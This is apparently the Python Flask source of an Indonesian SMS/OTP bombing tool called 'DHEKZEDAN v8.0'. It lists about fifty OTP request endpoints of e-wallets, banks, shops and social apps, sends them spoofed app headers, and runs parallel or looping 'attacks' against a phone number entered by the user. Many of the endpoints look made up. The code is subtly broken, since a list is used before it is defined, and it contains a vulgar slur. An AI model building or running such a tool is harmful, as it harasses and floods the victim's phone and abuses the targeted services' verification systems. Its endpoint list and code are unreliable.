from flask import Flask, request, jsonify, send_from_directory
import requests
import time
import random
import uuid
import concurrent.futures
import threading

app = Flask(__name__, static_folder='../public')
def test_endpoint(provider):
    """Test apakah endpoint masih hidup"""
    try:
        res = requests.get(provider['url'], timeout=3)
        return res.status_code != 404
    except:
        return False

# Pas start spam, filter dulu provider yang hidup
active_providers = [p for p in OTP_PROVIDERS if test_endpoint(p)]
print(f"🔥 {len(active_providers)} provider masih hidup dari {len(OTP_PROVIDERS)}")
# ================== 50+ PROVIDER OTP ================== #
OTP_PROVIDERS = [
    # E-WALLET & PAYMENT
    {
        'name': 'Gojek',
        'url': 'https://api.gojekapi.com/v3/customers/request_otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Gojek/4.59.1 (Android; 12)',
            'X-AppVersion': '4.59.1',
            'X-Location': '-6.21462,106.84513',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Gojek 2',
        'url': 'https://gorest.gojekapi.com/v3/customers/request_otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Gojek/4.59.1 (Android; 12)',
            'X-AppVersion': '4.59.1',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'OVO',
        'url': 'https://api.ovo.id/v1.0/api/auth/customer/login2FA',
        'method': 'POST',
        'headers': {
            'User-Agent': 'OVO/3.32.0 (Android; 12)',
            'OVO-Device-Id': str(uuid.uuid4()),
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}', 'deviceId': str(uuid.uuid4())}
    },
    {
        'name': 'OVO 2',
        'url': 'https://api.ovo.id/v1.0/api/auth/customer/registration2FA',
        'method': 'POST',
        'headers': {
            'User-Agent': 'OVO/3.32.0 (Android; 12)',
            'OVO-Device-Id': str(uuid.uuid4()),
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}', 'deviceId': str(uuid.uuid4())}
    },
    {
        'name': 'Dana',
        'url': 'https://emaskul.dana.id/api/account/phone/otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Dana/2.18.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}'}
    },
    {
        'name': 'Dana 2',
        'url': 'https://api.dana.id/sdk/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Dana/2.18.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}', 'action': 'LOGIN'}
    },
    {
        'name': 'LinkAja',
        'url': 'https://api.linkaja.com/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'LinkAja/3.2.1 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'msisdn': '0{phone}', 'channel': 'mobile'}
    },
    
    # E-COMMERCE
    {
        'name': 'Tokopedia',
        'url': 'https://accounts.tokopedia.com/token/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'okhttp/4.9.2',
            'X-Platform': 'android',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '{phone}', 'source': 'register'}
    },
    {
        'name': 'Tokopedia 2',
        'url': 'https://api.tokopedia.com/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'okhttp/4.9.2',
            'X-Platform': 'android',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '{phone}'}
    },
    {
        'name': 'Shopee',
        'url': 'https://shopee.co.id/api/v4/account/request_otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Shopee/3.2.16 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}', 'type': 0}
    },
    {
        'name': 'Shopee 2',
        'url': 'https://mall.shopee.co.id/api/v4/account/request_otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Shopee/3.2.16 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}', 'type': 1}
    },
    {
        'name': 'Lazada',
        'url': 'https://api.lazada.co.id/rest/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Lazada/6.35.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'mobile': '+62{phone}', 'countryCode': 'ID'}
    },
    {
        'name': 'Blibli',
        'url': 'https://api.blibli.com/v2/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Blibli/2.8.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}'}
    },
    {
        'name': 'Bukalapak',
        'url': 'https://api.bukalapak.com/v2/otp/request.json',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Bukalapak/3.2.1 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone_number': '+62{phone}'}
    },
    
    # TRANSPORTATION & TRAVEL
    {
        'name': 'Grab',
        'url': 'https://api.grab.com/v2/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Grab/8.98.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}', 'countryCode': 'ID'}
    },
    {
        'name': 'Grab 2',
        'url': 'https://api.grab.com/v3/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Grab/8.98.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}', 'countryCode': 'ID'}
    },
    {
        'name': 'Traveloka',
        'url': 'https://api.traveloka.com/v3/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Traveloka/3.45.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}', 'countryCode': 'ID'}
    },
    {
        'name': 'Traveloka 2',
        'url': 'https://api.traveloka.com/v2/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Traveloka/3.45.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Tiket.com',
        'url': 'https://api.tiket.com/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Tiket/4.2.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Pegipegi',
        'url': 'https://api.pegipegi.com/v1/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Pegipegi/2.1.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    
    # BANKING
    {
        'name': 'BCA',
        'url': 'https://ibank.klikbca.com/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Android; 12; Mobile)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '{phone}'}
    },
    {
        'name': 'Mandiri',
        'url': 'https://bankmandiri.co.id/api/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mandiri/3.0.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'msisdn': '{phone}'}
    },
    {
        'name': 'BRI',
        'url': 'https://ib.bri.co.id/ib-prelogin/otp-request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Android; 12; Mobile)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '{phone}'}
    },
    {
        'name': 'BNI',
        'url': 'https://bni.co.id/api/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'BNI/2.1.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '{phone}'}
    },
    {
        'name': 'CIMB Niaga',
        'url': 'https://cimbniaga.co.id/api/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'CIMB/3.2.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}'}
    },
    
    # DIGITAL & OTHERS
    {
        'name': 'Google',
        'url': 'https://accounts.google.com/_/signup/phone/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mozilla/5.0 (Android; 12; Mobile)',
            'Content-Type': 'application/json'
        },
        'data': {'phoneNumber': '+62{phone}'}
    },
    {
        'name': 'Facebook',
        'url': 'https://graph.facebook.com/v12.0/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Facebook/312.0.0.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}', 'country_code': 'ID'}
    },
    {
        'name': 'Instagram',
        'url': 'https://i.instagram.com/api/v1/accounts/send_otp/',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Instagram 219.0.0.0 (Android; 12)',
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        'data': {'phone_number': '+62{phone}'}
    },
    {
        'name': 'WhatsApp',
        'url': 'https://v.whatsapp.net/v2/code',
        'method': 'POST',
        'headers': {
            'User-Agent': 'WhatsApp/2.22.1 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '62{phone}'}
    },
    {
        'name': 'Telegram',
        'url': 'https://my.telegram.org/auth/send_password',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Telegram/8.5.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Discord',
        'url': 'https://discord.com/api/v9/auth/phone/verify',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Discord/128.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Twitter',
        'url': 'https://api.twitter.com/1.1/account/phone_number/verify.json',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Twitter/9.0.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone_number': '+62{phone}'}
    },
    {
        'name': 'Tiktok',
        'url': 'https://api.tiktok.com/v1/account/otp/send/',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Tiktok/23.1.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Spotify',
        'url': 'https://spclient.wg.spotify.com/signup/public/v1/account/otp',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Spotify/8.7.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Netflix',
        'url': 'https://www.netflix.com/api/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Netflix/8.2.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Disney+',
        'url': 'https://api.disneyplus.com/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Disney+/2.1.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Vidio',
        'url': 'https://api.vidio.com/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Vidio/4.2.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Mola TV',
        'url': 'https://api.mola.tv/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Mola TV/1.5.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'GoPlay',
        'url': 'https://api.goplay.co.id/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'GoPlay/1.2.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Zalora',
        'url': 'https://api.zalora.co.id/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Zalora/3.4.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Sociolla',
        'url': 'https://api.sociolla.com/v1/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Sociolla/2.3.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Berrybenka',
        'url': 'https://api.berrybenka.com/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Berrybenka/1.9.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Hijup',
        'url': 'https://api.hijup.com/v1/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Hijup/2.1.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Bhinneka',
        'url': 'https://api.bhinneka.com/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Bhinneka/3.0.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'JD.ID',
        'url': 'https://api.jd.id/v1/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'JD.ID/5.2.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Alfamart',
        'url': 'https://api.alfamart.co.id/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Alfamart/1.8.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Indomaret',
        'url': 'https://api.indomaret.co.id/v1/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Indomaret/2.1.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'KFC',
        'url': 'https://api.kfc.co.id/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'KFC/1.5.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'McD',
        'url': 'https://api.mcdonalds.co.id/v1/otp/send',
        'method': 'POST',
        'headers': {
            'User-Agent': 'McD/2.0.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
    {
        'name': 'Starbucks',
        'url': 'https://api.starbucks.co.id/v1/otp/request',
        'method': 'POST',
        'headers': {
            'User-Agent': 'Starbucks/3.1.0 (Android; 12)',
            'Content-Type': 'application/json'
        },
        'data': {'phone': '+62{phone}'}
    },
]

@app.route('/')
def serve_frontend():
    return send_from_directory('../public', 'index.html')

@app.route('/api/start', methods=['POST'])
def start_spam():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        attack_type = data.get('type', 'massive')  # 'massive' atau 'loop'
        loops = int(data.get('loops', 1))  # kalo loop mode, berapa kali ulang
        
        # Validasi nomor
        if not phone or not phone.isdigit() or len(phone) < 10:
            return jsonify({
                'error': 'Nomor HP ga valid, minimal 10 digit!',
                'success': False
            }), 400
        
        print(f"[LOG] Mode: {attack_type.upper()} - Target: {phone}")
        
        results = {
            'total_providers': len(OTP_PROVIDERS),
            'total_attacks': 0,
            'success': 0,
            'failed': 0,
            'details': []
        }
        
        if attack_type == 'massive':
            # MODE MASSIVE: 1x serang semua provider
            results['total_attacks'] = len(OTP_PROVIDERS)
            
            # Pake ThreadPoolExecutor buat paralel
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                future_to_provider = {
                    executor.submit(send_otp_to_provider, provider, phone): provider 
                    for provider in OTP_PROVIDERS
                }
                
                for future in concurrent.futures.as_completed(future_to_provider):
                    provider = future_to_provider[future]
                    try:
                        result = future.result(timeout=10)
                        results['details'].append(result)
                        if result['status'] == 'success':
                            results['success'] += 1
                        else:
                            results['failed'] += 1
                    except Exception as e:
                        results['failed'] += 1
                        results['details'].append({
                            'provider': provider['name'],
                            'status': 'error',
                            'message': str(e)
                        })
        
        elif attack_type == 'loop':
            # MODE LOOP: ulang semua provider beberapa kali
            results['total_attacks'] = len(OTP_PROVIDERS) * loops
            
            for loop in range(loops):
                for provider in OTP_PROVIDERS:
                    result = send_otp_to_provider(provider, phone)
                    results['details'].append(result)
                    if result['status'] == 'success':
                        results['success'] += 1
                    else:
                        results['failed'] += 1
                    time.sleep(0.2)  # delay minimal
        
        return jsonify({
            'success': True,
            'mode': attack_type,
            'results': results,
            'message': f'🔥 Selesai! {results["success"]} sukses dari {results["total_attacks"]} serangan ke {len(OTP_PROVIDERS)} provider'
        })
        
    except Exception as e:
        return jsonify({
            'error': str(e),
            'success': False
        }), 500

def send_otp_to_provider(provider, phone):
    """Kirim OTP ke 1 provider"""
    try:
        # Format data
        data = {}
        for key, value in provider.get('data', {}).items():
            if isinstance(value, str):
                data[key] = value.format(phone=phone)
            else:
                data[key] = value
        
        # Generate random device ID kalo perlu
        headers = provider.get('headers', {}).copy()
        if '{device_id}' in str(headers):
            headers = {k: v.replace('{device_id}', str(uuid.uuid4())) for k, v in headers.items()}
        
        # Kirim request
        if provider['method'] == 'POST':
            res = requests.post(
                provider['url'],
                json=data,
                headers=headers,
                timeout=5
            )
        else:
            res = requests.get(
                provider['url'],
                params=data,
                headers=headers,
                timeout=5
            )
        
        status = 'success' if res.status_code in [200, 201, 202, 204] else 'failed'
        
        return {
            'provider': provider['name'],
            'status': status,
            'code': res.status_code
        }
        
    except Exception as e:
        return {
            'provider': provider['name'],
            'status': 'error',
            'message': str(e)
        }

@app.route('/api/providers')
def list_providers():
    """List semua provider yang tersedia"""
    providers = [{'name': p['name']} for p in OTP_PROVIDERS]
    return jsonify({
        'total': len(providers),
        'providers': providers
    })

@app.route('/api/health')
def health():
    return jsonify({
        'status': 'hidup kontol!',
        'providers': len(OTP_PROVIDERS),
        'message': f'DHEKZEDAN v8.0 siap tempur dengan {len(OTP_PROVIDERS)} provider!'
    })

app = app
